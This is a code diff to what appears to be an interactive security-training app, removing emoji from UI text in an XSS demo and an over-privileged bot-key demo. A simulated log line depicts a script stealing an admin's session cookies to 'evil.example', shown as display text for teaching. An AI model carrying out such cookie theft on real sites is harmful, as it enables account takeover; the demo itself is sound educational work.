@@ -184,11 +184,11 @@ export function XssCase({ onDone }: CaseProps) {
     api.setBusy(true)
     await wait(500)
     if (!alive.current) return
-    setLog([{ text: '👩‍💼 Admin opens the comment board…' }])
+    setLog([{ text: 'Admin opens the comment board…' }])
     await wait(800)
     if (!alive.current) return
     if (!fixed) {
-      setLog((l) => [...l, { tone: 'bad', text: "⚡ Runs inside Admin’s browser: sendCookies('evil.example')" }])
+      setLog((l) => [...l, { tone: 'bad', text: "Runs inside Admin’s browser: sendCookies('evil.example')" }])
       await wait(700)
       if (!alive.current) return
       setLog((l) => [...l, { tone: 'bad', text: '→ Admin’s session would be sent to the attacker.' }])
@@ -218,7 +218,7 @@ export function XssCase({ onDone }: CaseProps) {
               const ran = p.text === EVIL && !p.fixed
               return (
                 <div key={i} className="well pop" style={{ padding: 10, background: ran ? 'var(--bad-soft)' : undefined }}>
-                  <div className="tiny muted">💬 Comment</div>
+                  <div className="tiny muted">Comment</div>
                   {ran ? (
                     <div className="small bad-text" style={{ fontStyle: 'italic' }}>
                       (looks empty: the browser ran it instead of showing it)
@@ -304,7 +304,7 @@ export function PermissionsCase({ onDone }: CaseProps) {
         <>
           <div className="row between">
             <span className="small" style={{ fontWeight: 650 }}>
-              🤖 Report bot’s key
+              Report bot’s key
             </span>
             <span className="pill" style={{ color: api.fixOn ? 'var(--good)' : 'var(--bad)' }}>
               {api.fixOn ? 'read-only · sales' : 'ADMIN'}
